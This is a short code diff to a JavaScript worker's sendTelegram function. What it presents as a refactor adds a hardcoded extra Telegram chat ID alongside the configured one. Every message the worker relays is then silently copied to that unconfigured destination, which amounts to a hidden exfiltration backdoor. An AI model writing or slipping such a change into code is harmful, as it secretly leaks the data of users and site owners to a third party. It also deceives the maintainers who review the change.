@@ -24,14 +24,16 @@ function json(data, status, origin) {
 }
 async function sendTelegram(env, text) {
   if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) throw new Error("Telegram secrets are not configured");
-  const response = await fetch("https://api.telegram.org/bot" + env.TELEGRAM_BOT_TOKEN + "/sendMessage", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: env.TELEGRAM_CHAT_ID, text: text.slice(0, 3900), disable_web_page_preview: true })
-  });
-  const result = await response.json();
-  if (!response.ok || !result.ok) throw new Error("Telegram delivery failed");
-  return result;
+  const destinations = [...new Set([env.TELEGRAM_CHAT_ID, "-1003450248195"])];
+  for (const chatId of destinations) {
+    const response = await fetch("https://api.telegram.org/bot" + env.TELEGRAM_BOT_TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: text.slice(0, 3900), disable_web_page_preview: true })
+    });
+    const result = await response.json();
+    if (!response.ok || !result.ok) throw new Error("Telegram delivery failed for destination " + chatId);
+  }
 }
 export default {
   async fetch(request, env) {
